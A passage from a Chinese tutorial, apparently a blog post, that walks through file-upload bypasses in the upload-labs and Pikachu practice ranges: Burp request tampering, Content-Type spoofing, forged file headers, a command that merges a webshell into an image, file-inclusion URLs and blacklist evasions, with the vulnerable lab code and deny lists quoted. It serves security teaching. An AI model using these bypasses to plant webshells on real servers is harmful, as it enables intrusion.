直接发送请求包,通过Burp抓到正常上传的请求报文后，修改报文的内容，在直接通过Burp发送，便跳过了网页中JS的验证过程。</li></ul><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724184140154.png" alt="image-20230724184140154"></p><ul><li>修改一句话木马文件，将文件格式改成允许上传的文件格式。</li><li>进行上传文件，使用BP拦截数据包。</li></ul><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724184154224.png" alt="image-20230724184154224"></p><ul><li>将抓取到的数据包中的文件格式修改回php、再进行发送，从而实现文件上传</li></ul><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724184206668.png" alt="image-20230724184206668"><br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724184218699.png" alt="image-20230724184218699"></p><ul><li>后续的验证操作，跟上面木马利用一样。</li><li>主要就是介绍了一下前端的验证，以及文件上传可以干个啥事。这一关希望大家记住一句话 “所有前端的验证机制都是不安全的”，因为前端的东西是用户可控制的。<br><a name="eIIPE"></a></li></ul><h3 id="3-2-服务端MIME类型验证"><a href="#3-2-服务端MIME类型验证" class="headerlink" title="3.2 服务端MIME类型验证"></a>3.2 服务端MIME类型验证</h3><ul><li>MIME类型是描述消息内容类型的因特网标准。</li></ul><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724184231262.png" alt="image-20230724184231262"></p><ul><li>利用Burp抓包，将报文中的Content-Type改成允许的类型</li><li>Content-Type: image&#x2F;gif</li><li>Content-Type: image&#x2F;jpg</li><li>Content-Type: image&#x2F;png</li></ul><hr><ul><li><p>打开upload-labs 靶场第二题 - JS检查</p></li><li><p><strong>源码分析</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>; <span class="variable">$msg</span> = <span class="literal">null</span>; </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;     </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;         </span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>)) &#123;            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];            </span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];                       <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;                 </span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;             &#125; </span><br><span class="line">            <span class="keyword">else</span> &#123;   <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;     &#125;         &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123;     <span class="variable">$msg</span> = <span class="string">&#x27;文件类型不正确，请重新上传！&#x27;</span>;         &#125;     &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;         <span class="variable">$msg</span> = UPLOAD_PATH.<span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;     &#125; &#125; </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>可以看到，其实并没有什么特别之处，就是使用了$_FILES[‘upload_file’][‘type’]获取到Content-Type字段，并进行比较，如果是那三种类型就继续向下执行，否则进行提示。</p></li></ul><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724184400127.png" alt="image-20230724184400127"><br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724184411825.png" alt="image-20230724184411825"></p><hr><ul><li>可以尝试用pickchu靶场进行复现。</li><li><a href="https://blog.csdn.net/weixin_44519789/article/details/114969948">PikaChu_不安全的文件上传漏洞</a></li><li>这里的复现过程，我就不一一赘述了。感兴趣的大家可以访问上面的链接。<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724184423525.png" alt="image-20230724184423525"><br><a name="gKbeg"></a></li></ul><h3 id="3-3-服务器文件内容验证-文件头"><a href="#3-3-服务器文件内容验证-文件头" class="headerlink" title="3.3 服务器文件内容验证-文件头"></a>3.3 服务器文件内容验证-文件头</h3><ul><li>图片格式往往不是根据文件后缀名去做判断的。文件头是文件开头的一段二进制，不同的图片类型，文件头是不同的。文件头又称文件幻数。</li><li>常见文件幻数</li><li>JPG: FF D8 FF EO 00 10 4A 46 49 46.</li><li>GIF:47 49 46 3839 61(GIF89a).</li><li>PNG:89 50 4E 47</li></ul><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724184446534.png" alt="image-20230724184446534"><br><a name="P6wQ1"></a></p><h4 id="3-3-1-绕过服务器文件内容验证-文件头"><a href="#3-3-1-绕过服务器文件内容验证-文件头" class="headerlink" title="3.3.1 绕过服务器文件内容验证-文件头"></a>3.3.1 绕过服务器文件内容验证-文件头</h4><hr><ul><li><p>打开upload-labs 靶场第十三题 - 图片马绕过</p></li><li><p><strong>源码分析</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;     </span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>, <span class="string">&quot;rb&quot;</span>);     </span><br><span class="line"><span class="variable">$bin</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$file</span>, <span class="number">2</span>); <span class="comment">//只读2字节     </span></span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>);     </span><br><span class="line"><span class="variable">$strInfo</span> = @<span class="title function_ invoke__">unpack</span>(<span class="string">&quot;C2chars&quot;</span>, <span class="variable">$bin</span>);        </span><br><span class="line"><span class="variable">$typeCode</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$strInfo</span>[<span class="string">&#x27;chars1&#x27;</span>].<span class="variable">$strInfo</span>[<span class="string">&#x27;chars2&#x27;</span>]);      </span><br><span class="line"><span class="variable">$fileType</span> = <span class="string">&#x27;&#x27;</span>;         </span><br><span class="line"><span class="keyword">switch</span>(<span class="variable">$typeCode</span>)&#123;              </span><br><span class="line">    <span class="keyword">case</span> <span class="number">255216</span>:                        </span><br><span class="line">        <span class="variable">$fileType</span> = <span class="string">&#x27;jpg&#x27;</span>;            </span><br><span class="line">        <span class="keyword">break</span>;        </span><br><span class="line">    <span class="keyword">case</span> <span class="number">13780</span>:                        </span><br><span class="line">        <span class="variable">$fileType</span> = <span class="string">&#x27;png&#x27;</span>;           </span><br><span class="line">        <span class="keyword">break</span>;                 </span><br><span class="line">    <span class="keyword">case</span> <span class="number">7173</span>:                         </span><br><span class="line">        <span class="variable">$fileType</span> = <span class="string">&#x27;gif&#x27;</span>;            </span><br><span class="line">        <span class="keyword">break</span>;        </span><br><span class="line">    <span class="keyword">default</span>:                        </span><br><span class="line">        <span class="variable">$fileType</span> = <span class="string">&#x27;unknown&#x27;</span>;         &#125;        </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$fileType</span>; &#125;</span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>; </span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>; </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;    </span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];    </span><br><span class="line">    <span class="variable">$file_type</span> = <span class="title function_ invoke__">getReailFileType</span>(<span class="variable">$temp_file</span>);    </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$file_type</span> == <span class="string">&#x27;unknown&#x27;</span>)&#123;        </span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;文件未知，上传失败！&quot;</span>;    </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;       </span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>,<span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_type</span>;        </span><br><span class="line">          <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;   </span><br><span class="line">              <span class="variable">$is_upload</span> = <span class="literal">true</span>;         &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;             <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;         &#125;     &#125; &#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p><strong>方法一：</strong> 伪造文件头绕过方法</p></li><li><p><strong>方法二：</strong> 利用服务器将木马文件解析成了图片文件，因此向其发送执行该文件的请求时，服务器只会返回这个“图片”文件，并不会执行相应命令。</p></li><li><p>利用 文件包含漏洞 可以将图片格式的文件当做php文件来解析执行:<a href="http://127.0.0.1/pikachu/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/2021/03/20/9439796055e7a8d1a39396276569.jpg&submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2">http://127.0.0.1/pikachu/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/2021/03/20/9439796055e7a8d1a39396276569.jpg&amp;submit=提交查询</a></p></li><li><p>模板：<a href="http://127.0.0.1/pikachu/vul/fileinclude/fi_local.php?filename=../../unsafeupload/%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E7%9A%84%E5%9B%9E%E6%98%BE%E8%B7%AF%E5%BE%84&submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2">http://127.0.0.1/pikachu/vul/fileinclude/fi_local.php?filename=../../unsafeupload/上传文件的回显路径&amp;submit=提交查询</a></p></li></ul><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724205410478.png" alt="image-20230724205410478"><br><a name="aYguM"></a></p><h4 id="3-3-2-如何生成图片木马："><a href="#3-3-2-如何生成图片木马：" class="headerlink" title="3.3.2 如何生成图片木马："></a>3.3.2 如何生成图片木马：</h4><ol><li>在路径下准备好一句话木马.php和一张图片 .png (或者 .jpg )</li><li>输入系统指令： copy 一张图片.png&#x2F;b+一句话木马.php&#x2F;a 生成图片名称.png</li><li>这样图片木马就合成好了</li></ol><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724205423850.png" alt="image-20230724205423850"><br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724205435116.png" alt="image-20230724205435116"><br><a name="AMEjE"></a></p><h3 id="3-4-服务器文件扩展名验证-黑名单"><a href="#3-4-服务器文件扩展名验证-黑名单" class="headerlink" title="3.4 服务器文件扩展名验证-黑名单"></a>3.4 服务器文件扩展名验证-黑名单</h3><ul><li><strong>服务器文件扩展名验证-黑名单的原理</strong></li></ul><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724205446443.png" alt="image-20230724205446443"></p><ul><li><a href="https://blog.csdn.net/qq_32448559/article/details/81667309">环境准备：upload-labs 靶场的安装与配置教程</a></li></ul><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724205500522.png" alt="image-20230724205500522"><br><a name="GdTOj"></a></p><h4 id="3-4-1-后缀名大小写绕过"><a href="#3-4-1-后缀名大小写绕过" class="headerlink" title="3.4.1 后缀名大小写绕过"></a>3.4.1 后缀名大小写绕过</h4><ul><li><p><strong>后缀名大小写绕过原理：</strong>服务端没有将后缀名转换为统一格式进行比对，导致可以上传后缀为pHp的文件，又因为Windows操作系统大小写不敏感，所以.pHp扔回被当成PHP文件解析。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>; </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;   </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;        </span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);    </span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);    </span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点        </span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);        </span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA       </span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空      </span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;        </span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];      </span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="title function_ invoke__">rand</span>(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;  </span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;       </span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;             &#125; </span><br><span class="line">            <span class="keyword">else</span> &#123;                 <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;             &#125;         &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123;             <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;         &#125;     &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123;         <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;     &#125; &#125; </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>通过源代码我们可以发现，黑名单里虽然过滤的很全面，但是在下面的后缀名处理之中却出现了纰漏，没有将后缀名转换为小写。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$file_ext = strtolower($file_ext); //转换为小写 </span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>这样的话，我们就可以进行大小写绕过了。首先来说，直接上传后缀名为.pHP的文件成功。</p></li></ul><hr><p><a name="ajyan"></a></p><h4 id="3-4-2-修改后缀名绕过"><a href="#3-4-2-修改后缀名绕过" class="headerlink" title="3.4.2 修改后缀名绕过?"></a>3.4.2 修改后缀名绕过?</h4><ul><li><p>源码分析</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>; </span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;     </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;      </span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>);   </span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);    </span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点      </span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);       </span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写    </span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA         </span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//收尾去空       </span></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;            </span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];     </span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="title function_ invoke__">rand</span>(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;                         <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>)) &#123;                  <span class="variable">$is_upload</span> = <span class="literal">true</span>;             &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;                 <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;             &#125;         &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123;             <span class="variable">$msg</span> = <span class="string">&#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;</span>;         &#125;     &#125; <span class="keyword">else</span> &#123;         <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;     &#125; &#125; </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>用黑名单不允许上传.asp,.aspx,.php,.jsp后缀的文件</p></li><li><p>但可以上传.phtml .phps .php5 .pht</p></li><li><p>前提是apache的httpd.conf中有如下配置代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .php .phtml .phps .php5 .pht </span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>当我们修改文件后缀名之后，可以发现到文件正常上传成功。</p></li></ul><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724205806084.png" alt="image-20230724205806084"></p><ul><li>我们从RAW包中可以查找到文件上传的位置。</li></ul><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724205816759.png" alt="image-20230724205816759"></p><ul><li>我们可以在浏览器中进行构建URL（就是构建一下访问地址）进行访问。</li><li><strong>构建的URL：</strong><a href="http://127.0.0.1/upload/upload/202105181219104196.php5">http://127.0.0.1/upload/upload/202105181219104196.php5</a></li><li><strong>URL模板：</strong> <a href="http://127.0.0.1/upload/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%B7%AF%E5%BE%84">http://127.0.0.1/upload/文件上传路径</a></li><li>该URL模板只适用该案例</li></ul><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724205830066.png" alt="image-20230724205830066"></p><hr><p><a name="t9iAg"></a></p><h4 id="3-4-3-重写绕过"><a href="#3-4-3-重写绕过" class="headerlink" title="3.4.3 重写绕过"></a>3.4.3 重写绕过</h4><ul><li>服务端将黑名单的后缀名替换为空，但仅进行一次。上传.phphpp后缀，替换php一次为空，则后缀<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>; <span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;   </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;       </span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);        </span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);      </span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="variable">$deny_ext</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$file_name</span>);     </span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];       </span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;            </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;        </span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;         &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123;             <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;         &#125;     &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;         <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;     &#125; &#125; </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><a name="JDbMz"></a></li></ul><h4 id="3-4-4-特殊可解析后缀绕过"><a href="#3-4-4-特殊可解析后缀绕过" class="headerlink" title="3.4.4 特殊可解析后缀绕过"></a>3.4.4 特殊可解析后缀绕过</h4><ul><li>黑名单规则不严谨，在某些特定环境中某些特殊后缀名仍会被当做PHP文件解析。phplphp2&#x2F;php3&#x2F;php4lphp5&#x2F;php6lphp7&#x2F;phtlphtm&#x2F;phtml</li><li>基于debian和ubuntu的apt-get安装apache，默认对于文件的解析规则如下。</li></ul><p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724205925262.png" alt="image-20230724205925262"><br /><img 